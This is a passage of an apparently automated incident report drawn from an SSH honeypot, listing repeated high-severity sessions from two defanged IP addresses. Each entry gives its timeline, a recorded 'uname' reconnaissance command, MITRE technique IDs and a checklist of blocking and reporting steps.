| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:12` | `cowrie.session.connect` |
| `2026-08-25 05:02:12` | `cowrie.client.version` |
| `2026-08-25 05:02:12` | `cowrie.client.kex` |
| `2026-08-25 05:02:14` | `cowrie.login.success` |
| `2026-08-25 05:02:15` | `cowrie.session.params` |
| `2026-08-25 05:02:15` | `cowrie.command.input` |
| `2026-08-25 05:02:15` | `cowrie.command.input` |
| `2026-08-25 05:02:16` | `cowrie.command.input` |
| `2026-08-25 05:02:16` | `cowrie.command.input` |
| `2026-08-25 05:02:16` | `cowrie.command.input` |
| `2026-08-25 05:02:16` | `cowrie.command.success` |
| `2026-08-25 05:02:16` | `cowrie.command.input` |
| `2026-08-25 05:02:16` | `cowrie.command.input` |
| `2026-08-25 05:02:16` | `cowrie.command.input` |
| `2026-08-25 05:02:16` | `cowrie.command.input` |
| `2026-08-25 05:02:16` | `cowrie.log.closed` |
| `2026-08-25 05:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-869b5c645b68

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:13` | `cowrie.session.connect` |
| `2026-08-25 05:02:13` | `cowrie.client.version` |
| `2026-08-25 05:02:13` | `cowrie.client.kex` |
| `2026-08-25 05:02:13` | `cowrie.login.success` |
| `2026-08-25 05:02:14` | `cowrie.session.params` |
| `2026-08-25 05:02:14` | `cowrie.command.input` |
| `2026-08-25 05:02:14` | `cowrie.log.closed` |
| `2026-08-25 05:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-994b2688a4cd

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:17` | `cowrie.session.connect` |
| `2026-08-25 05:02:17` | `cowrie.client.version` |
| `2026-08-25 05:02:18` | `cowrie.client.kex` |
| `2026-08-25 05:02:18` | `cowrie.login.success` |
| `2026-08-25 05:02:19` | `cowrie.session.params` |
| `2026-08-25 05:02:19` | `cowrie.command.input` |
| `2026-08-25 05:02:19` | `cowrie.log.closed` |
| `2026-08-25 05:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30e96bdbb26c

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:22` | `cowrie.session.connect` |
| `2026-08-25 05:02:22` | `cowrie.client.version` |
| `2026-08-25 05:02:22` | `cowrie.client.kex` |
| `2026-08-25 05:02:22` | `cowrie.login.success` |
| `2026-08-25 05:02:23` | `cowrie.session.params` |
| `2026-08-25 05:02:23` | `cowrie.command.input` |
| `2026-08-25 05:02:23` | `cowrie.log.closed` |
| `2026-08-25 05:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db87f6012088

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:26` | `cowrie.session.connect` |
| `2026-08-25 05:02:26` | `cowrie.client.version` |
| `2026-08-25 05:02:26` | `cowrie.client.kex` |
| `2026-08-25 05:02:27` | `cowrie.login.success` |
| `2026-08-25 05:02:27` | `cowrie.session.params` |
| `2026-08-25 05:02:27` | `cowrie.command.input` |
| `2026-08-25 05:02:27` | `cowrie.log.closed` |
| `2026-08-25 05:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f354b23e44

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:31` | `cowrie.session.connect` |
| `2026-08-25 05:02:31` | `cowrie.client.version` |
| `2026-08-25 05:02:31` | `cowrie.client.kex` |
| `2026-08-25 05:02:31` | `cowrie.login.success` |
| `2026-08-25 05:02:32` | `cowrie.session.params` |
| `2026-08-25 05:02:32` | `cowrie.command.input` |
| `2026-08-25 05:02:32` | `cowrie.log.closed` |
| `2026-08-25 05:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-388f846b787b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:35` | `cowrie.session.connect` |
| `2026-08-25 05:02:35` | `cowrie.client.version` |
| `2026-08-25 05:02:35` | `cowrie.client.kex` |
| `2026-08-25 05:02:36` | `cowrie.login.success` |
| `2026-08-25 05:02:37` | `cowrie.session.params` |
| `2026-08-25 05:02:37` | `cowrie.command.input` |
| `2026-08-25 05:02:37` | `cowrie.log.closed` |
| `2026-08-25 05:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d92c3587ef

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:40` | `cowrie.session.connect` |
| `2026-08-25 05:02:40` | `cowrie.client.version` |
| `2026-08-25 05:02:40` | `cowrie.client.kex` |
| `2026-08-25 05:02:40` | `cowrie.login.success` |
| `2026-08-25 05:02:41` | `cowrie.session.params` |
| `2026-08-25 05:02:41` | `cowrie.command.input` |
| `2026-08-25 05:02:41` | `cowrie.log.closed` |
| `2026-08-25 05:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-756ad4aca3b6

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:44` | `cowrie.session.connect` |
| `2026-08-25 05:02:45` | `cowrie.client.version` |
| `2026-08-25 05:02:45` | `cowrie.client.kex` |
| `2026-08-25 05:02:45` | `cowrie.login.success` |
| `2026-08-25 05:02:46` | `cowrie.session.params` |
| `2026-08-25 05:02:46` | `cowrie.command.input` |
| `2026-08-25 05:02:46` | `cowrie.log.closed` |
| `2026-08-25 05:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8a4a1e97d4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:49` | `cowrie.session.connect` |
| `2026-08-25 05:02:49` | `cowrie.client.version` |
| `2026-08-25 05:02:49` | `cowrie.client.kex` |
| `2026-08-25 05:02:49` | `cowrie.login.success` |
| `2026-08-25 05:02:50` | `cowrie.session.params` |
| `2026-08-25 05:02:50` | `cowrie.command.input` |
| `2026-08-25 05:02:51` | `cowrie.log.closed` |
| `2026-08-25 05:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a9a2464c1b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:54` | `cowrie.session.connect` |
| `2026-08-25 05:02:54` | `cowrie.client.version` |
| `2026-08-25 05:02:54` | `cowrie.client.kex` |
| `2026-08-25 05:02:54` | `cowrie.login.success` |
| `2026-08-25 05:02:55` | `cowrie.session.params` |
| `2026-08-25 05:02:55` | `cowrie.command.input` |
| `2026-08-25 05:02:55` | `cowrie.log.closed` |
| `2026-08-25 05:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97e53f98d3ce

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:58` | `cowrie.session.connect` |
| `2026-08-25 05:02:58` | `cowrie.client.version` |
| `2026-08-25 05:02:58` | `cowrie.client.kex` |
| `2026-08-25 05:02:59` | `cowrie.login.success` |
| `2026-08-25 05:03:00` | `cowrie.session.params` |
| `2026-08-25 05:03:00` | `cowrie.command.input` |
| `2026-08-25 05:03:00` | `cowrie.log.closed` |
| `2026-08-25 05:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf54641a44d1

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:03` | `cowrie.session.connect` |
| `2026-08-25 05:03:03` | `cowrie.client.version` |
| `2026-08-25 05:03:03` | `cowrie.client.kex` |
| `2026-08-25 05:03:03` | `cowrie.login.success` |
| `2026-08-25 05:03:04` | `cowrie.session.params` |
| `2026-08-25 05:03:04` | `cowrie.command.input` |
| `2026-08-25 05:03:04` | `cowrie.log.closed` |
| `2026-08-25 05:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad5cc06731d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:08` | `cowrie.session.connect` |
| `2026-08-25 05:03:08` | `cowrie.client.version` |
| `2026-08-25 05:03:08` | `cowrie.client.kex` |
| `2026-08-25 05:03:08` | `cowrie.login.success` |
| `2026-08-25 05:03:09` | `cowrie.session.params` |
| `2026-08-25 05:03:09` | `cowrie.command.input` |
| `2026-08-25 05:03:09` | `cowrie.log.closed` |
| `2026-08-25 05:03:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce394ca5a30

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:12` | `cowrie.session.connect` |
| `2026-08-25 05:03:12` | `cowrie.client.version` |
| `2026-08-25 05:03:12` | `cowrie.client.kex` |
| `2026-08-25 05:03:13` | `cowrie.login.success` |
| `2026-08-25 05:03:14` | `cowrie.session.params` |
| `2026-08-25 05:03:14` | `cowrie.command.input` |
| `2026-08-25 05:03:14` | `cowrie.log.closed` |
| `2026-08-25 05:03:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d683334c4d7

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:17` | `cowrie.session.connect` |
| `2026-08-25 05:03:17` | `cowrie.client.version` |
| `2026-08-25 05:03:17` | `cowrie.client.kex` |
| `2026-08-25 05:03:17` | `cowrie.login.success` |
| `2026-08-25 05:03:18` | `cowrie.session.params` |
| `2026-08-25 05:03:18` | `cowrie.command.input` |
| `2026-08-25 05:03:18` | `cowrie.log.closed` |
| `2026-08-25 05:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0dd81a8639

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:21` | `cowrie.session.connect` |
| `2026-08-25 05:03:21` | `cowrie.client.version` |
| `2026-08-25 05:03:21` | `cowrie.client.kex` |
| `2026-08-25 05:03:21` | `cowrie.login.success` |
| `2026-08-25 05:03:23` | `cowrie.session.params` |
| `2026-08-25 05:03:23` | `cowrie.command.input` |
| `2026-08-25 05:03:23` | `cowrie.log.closed` |
| `2026-08-25 05:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36538a40703a

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:26` | `cowrie.session.connect` |
| `2026-08-25 05:03:26` | `cowrie.client.version` |
| `2026-08-25 05:03:26` | `cowrie.client.kex` |
| `2026-08-25 05:03:26` | `cowrie.login.success` |
| `2026-08-25 05:03:27` | `cowrie.session.params` |
| `2026-08-25 05:03:27` | `cowrie.command.input` |
| `2026-08-25 05:03:27` | `cowrie.log.closed` |
| `2026-08-25 05:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-743098107dfd

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:30` | `cowrie.session.connect` |
| `2026-08-25 05:03:30` | `cowrie.client.version` |
| `2026-08-25 05:03:30` | `cowrie.client.kex` |
| `2026-08-25 05:03:31` | `cowrie.login.success` |
| `2026-08-25 05:03:31` | `cowrie.session.params` |
| `2026-08-25 05:03:31` | `cowrie.command.input` |
| `2026-08-25 05:03:31` | `cowrie.log.closed` |
| `2026-08-25 05:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72d1fee20ec

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:35` | `cowrie.session.connect` |
| `2026-08-25 05:03:35` | `cowrie.client.version` |
| `2026-08-25 05:03:35` | `cowrie.client.kex` |
| `2026-08-25 05:03:35` | `cowrie.login.success` |
| `2026-08-25 05:03:36` | `cowrie.session.params` |
| `2026-08-25 05:03:36` | `cowrie.command.input` |
| `2026-08-25 05:03:36` | `cowrie.log.closed` |
| `2026-08-25 05:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9f4b153b4de

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:39` | `cowrie.session.connect` |
| `2026-08-25 05:03:39` | `cowrie.client.version` |
| `2026-08-25 05:03:39` | `cowrie.client.kex` |
| `2026-08-25 05:03:40` | `cowrie.login.success` |
| `2026-08-25 05:03:40` | `cowrie.session.params` |
| `2026-08-25 05:03:40` | `cowrie.command.input` |
| `2026-08-25 05:03:41` | `cowrie.log.closed` |
| `2026-08-25 05:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06f5631366ef

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:44` | `cowrie.session.connect` |
| `2026-08-25 05:03:44` | `cowrie.client.version` |
| `2026-08-25 05:03:44` | `cowrie.client.kex` |
| `2026-08-25 05:03:44` | `cowrie.login.success` |
| `2026-08-25 05:03:45` | `cowrie.session.params` |
| `2026-08-25 05:03:45` | `cowrie.command.input` |
| `2026-08-25 05:03:45` | `cowrie.log.closed` |
| `2026-08-25 05:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09532fefe185

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:48` | `cowrie.session.connect` |
| `2026-08-25 05:03:48` | `cowrie.client.version` |
| `2026-08-25 05:03:48` | `cowrie.client.kex` |
| `2026-08-25 05:03:49` | `cowrie.login.success` |
| `2026-08-25 05:03:49` | `cowrie.session.params` |
| `2026-08-25 05:03:49` | `cowrie.command.input` |
| `2026-08-25 05:03:49` | `cowrie.log.closed` |
| `2026-08-25 05:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a96698d9e38

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:52` | `cowrie.session.connect` |
| `2026-08-25 05:03:52` | `cowrie.client.version` |
| `2026-08-25 05:03:53` | `cowrie.client.kex` |
| `2026-08-25 05:03:53` | `cowrie.login.success` |
| `2026-08-25 05:03:53` | `cowrie.session.params` |
| `2026-08-25 05:03:53` | `cowrie.command.input` |
| `2026-08-25 05:03:54` | `cowrie.log.closed` |
| `2026-08-25 05:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0449d676a7d5

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:03 |
| **Last Seen** | 2026-08-25 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:03:57` | `cowrie.session.connect` |
| `2026-08-25 05:03:57` | `cowrie.client.version` |
| `2026-08-25 05:03:57` | `cowrie.client.kex` |
| `2026-08-25 05:03:57` | `cowrie.login.success` |
| `2026-08-25 05:03:58` | `cowrie.session.params` |
| `2026-08-25 05:03:58` | `cowrie.command.input` |
| `2026-08-25 05:03:58` | `cowrie.log.closed` |
| `2026-08-25 05:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00af8d5c27d4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:04 |
| **Last Seen** | 2026-08-25 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:04:02` | `cowrie.session.connect` |
| `2026-08-25 05:04:02` | `cowrie.client.version` |
